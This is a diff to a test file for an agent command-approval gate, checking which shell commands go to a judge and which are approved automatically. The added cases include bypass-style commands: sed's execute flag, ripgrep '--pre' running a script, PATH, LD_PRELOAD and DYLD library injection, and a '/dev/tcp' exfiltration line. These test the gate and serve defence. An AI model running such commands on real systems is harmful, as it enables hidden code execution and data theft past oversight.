@@ -1077,6 +1077,15 @@ describe('Auto approves everything (P13-26)', () => {
     'sudo rm x',
     'cat /etc/hosts > /dev/tcp/example.com/80',
     'sed -i s/a/b/ /etc/x',
+    'sed -n s/a/b/e /etc/hosts',
+    'sed -n 1,5p /etc/hosts',
+    'rg --pre /tmp/send.sh x .',
+    'rg --pre=/tmp/send.sh x .',
+    "rg '--pre' /tmp/send.sh x .",
+    'rg --pre-glob *.txt --pre /tmp/send.sh x .',
+    'PATH=/tmp/evil cat x',
+    'LD_PRELOAD=/tmp/e.so cat x',
+    'DYLD_INSERT_LIBRARIES=/tmp/e.dylib rg x',
   ])('%s goes to the judge (review C1)', async (command) => {
     const { judge, seen } = scripted(approve({ sendsOrSpends: false }));
     const { c, approve: approved } = auto(command);
@@ -1085,17 +1094,45 @@ describe('Auto approves everything (P13-26)', () => {
     expect(approved).toHaveBeenCalledTimes(1);
   });
 
-  it.each(['rm -rf /etc/x', 'cat /etc/hosts', 'mkdir -p /tmp/a', 'sed -n 1,5p /etc/hosts'])(
-    '%s is approved without the judge (review C1)',
-    async (command) => {
-      const { judge, seen } = scripted(sends());
-      const { c, approve: approved, hold } = auto(command);
-      await new ApprovalWatch({ judge }).handle(c);
-      expect(seen).toHaveLength(0);
-      expect(hold).not.toHaveBeenCalled();
-      expect(approved).toHaveBeenCalledWith(expect.objectContaining({ allowedBy: 'auto' }));
-    },
-  );
+  it.each([
+    'rm -rf /etc/x',
+    'cat /etc/hosts',
+    'mkdir -p /tmp/a',
+    'head /etc/hosts',
+    'tail /etc/hosts',
+    'wc /etc/hosts',
+    'ls /etc',
+    'find /tmp -name x',
+    'grep x /etc/hosts',
+    'rg x /etc/hosts',
+    'diff /etc/hosts /etc/hosts.bak',
+    'stat /etc/hosts',
+    'file /etc/hosts',
+    'touch /tmp/a',
+    'cp /etc/hosts /tmp/a',
+    'mv /tmp/a /tmp/b',
+    'rmdir /tmp/a',
+    'ln -s /etc/hosts /tmp/a',
+    'chmod 644 /tmp/a',
+    'LANG=C grep x /etc/hosts',
+    'LC_ALL=C cat /etc/hosts',
+  ])('%s is approved without the judge (review C1)', async (command) => {
+    const { judge, seen } = scripted(sends());
+    const { c, approve: approved, hold } = auto(command);
+    await new ApprovalWatch({ judge }).handle(c);
+    expect(seen).toHaveLength(0);
+    expect(hold).not.toHaveBeenCalled();
+    expect(approved).toHaveBeenCalledWith(expect.objectContaining({ allowedBy: 'auto' }));
+  });
+
+  it('a file command inside the workspace is tagged run_workspace: it goes to the judge', async () => {
+    // The gate tags a command that names no outside path `run_workspace`, which is not local.
+    const { judge, seen } = scripted(approve({ sendsOrSpends: false }));
+    const { c, approve: approved } = auto('find . -name x');
+    await new ApprovalWatch({ judge }).handle(c);
+    expect(seen).toHaveLength(1);
+    expect(approved).toHaveBeenCalledWith(expect.objectContaining({ allowedBy: 'auto' }));
+  });
 
   it('a Write tool to /tmp is approved without the judge (review C1)', async () => {
     const { judge, seen } = scripted(sends());
